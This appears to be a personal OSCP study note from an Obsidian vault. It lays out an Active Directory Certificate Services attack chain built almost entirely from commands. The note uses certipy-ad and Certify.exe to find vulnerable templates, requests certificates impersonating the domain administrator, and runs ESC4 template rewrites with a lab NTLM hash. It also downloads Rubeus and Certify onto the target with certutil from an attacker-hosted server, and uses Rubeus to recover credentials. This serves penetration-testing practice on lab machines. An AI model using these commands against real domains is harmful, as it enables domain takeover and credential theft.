Active Directory Certificate Service

https://github.com/GhostPack/Certify/wiki
### Certipy-ad 

Executed within KALI ATTACKER
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND"

const command = `certipy-ad find -u '[user]@${discoveredDomain}' -p 'Password' -target ${discoveredDomain} -text -stdout-vulnerable`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `certipy-ad find -vulnerable -u [user] -hashes [hash] -dc-ip ${ip} -stdout`;

dv.paragraph("```bash\n" + command + "\n```");
```
MODIFY VV

Req
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND"

const command = `certipy-ad req -u 'username' -p 'Password' -target ${discoveredDomain} -ca <ENTERP_NAME> -template <TEMPLATE> -upn administrator@${discoveredDomain}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Auth {Look steps below}
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `certipy-ad auth -pfx cert.pfx -dc-ip ${ip} -username administrator -domain ${discoveredDomain}`;

dv.paragraph("```bash\n" + command + "\n```");
```
### Certify.exe

Transferred into AD Target to be used

https://github.com/GhostPack/Certify.git

```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/Certify.exe Certify.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

```
./Certify.exe find /vulnerable /currentuser
```

---

## Scenarios

```
site:www.rbtsec.com
```

https://github.com/GhostPack/Certify/wiki

You encountered a version discrepancy:

- **Certify v1.0 (Older):** Uses Slash Syntax (`/ca:`, `/template:`, `/altname:`).
    
- **Certify v2.0+ (Modern):** Uses Double-Dash Syntax (`--ca`, `--template`, `--upn`, `--sid`).

```
./Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local
```

/CA: Full Domain Name\Enterprise Name

### Convert cert.pem to cert.pfx

Save the RSA cert to cert.pem

Convert it to cert.pfx
```
openssl pkcs12 -in cert.pfx -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pem
```

Verifying export password : {blank}

Start python server
```
cp /usr/share/windows-resources/rubeus/Rubeus.exe . && python -m http.server 80
```

Transfer Rubeus.exe to AD target
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/Rubeus.exe Rubeus.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Transfer cert.pfx to AD target
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/cert.pfx cert.pfx`;

dv.paragraph("```bash\n" + command + "\n```");
```
Run Rubeus
```
.\Rubeus.exe asktgt /user:administrator /certificate:C:\Users\Ryan.Cooper\Documents\cert.pfx /getcredentials /show /nowrap
```

Clock Sync
```
sudo systemctl stop systemd-timesyncd && sudo ntpdate -u sequel.htb
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `certipy-ad auth -pfx cert.pfx -dc-ip ${ip} -username administrator -domain ${discoveredDomain}`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

# ESC4

```
certipy-ad template -dc-ip 10.129.232.128 -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -target dc01.sequel.htb -write-default-configuration
```

```
certipy-ad req -ca sequel-DC01-CA -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb
```

